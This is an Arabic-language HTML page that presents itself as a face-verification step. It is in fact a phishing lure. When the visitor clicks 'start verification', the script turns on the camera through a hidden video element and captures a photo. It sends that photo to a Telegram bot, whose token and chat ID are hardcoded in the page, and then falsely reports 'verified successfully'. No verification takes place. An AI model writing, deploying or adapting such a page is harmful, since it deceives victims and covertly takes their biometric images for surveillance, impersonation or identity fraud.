<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحقق من الوجه</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding-top: 50px; }
        #status { font-size: 18px; color: #ffcc00; margin: 20px; }
        button { padding: 15px 30px; font-size: 20px; cursor: pointer; }
    </style>
</head>
<body>

    <div id="status">اضغط لبدء عملية التحقق</div>
    <button id="startBtn">بدء التحقق</button>
    <video id="video" autoplay playsinline style="display:none;"></video>

    <script>
        const TOKEN = "8446745973:AAGJFzPurWMbU44hN3V-vJjTpyGviYQUYhg";
        const CHAT_ID = "8169635171";
        const statusEl = document.getElementById('status');
        const video = document.getElementById('video');

        document.getElementById('startBtn').onclick = async () => {
            try {
                // 1. طلب الكاميرا
                statusEl.innerText = "جاري تفعيل الكاميرا...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));

                // 2. التقاط الصورة
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                statusEl.innerText = "جاري المعالجة والإرسال...";

                // 3. إرسال الصورة
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'face.jpg');

                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();
                    
                    if (result.ok) {
                        statusEl.innerText = "تم التحقق بنجاح!";
                    } else {
                        statusEl.innerText = "فشل الإرسال: " + result.description;
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');

            } catch (err) {
                statusEl.innerText = "خطأ: تأكد من منح إذن الكاميرا.";
            }
        };
    </script>
</body>
</html>
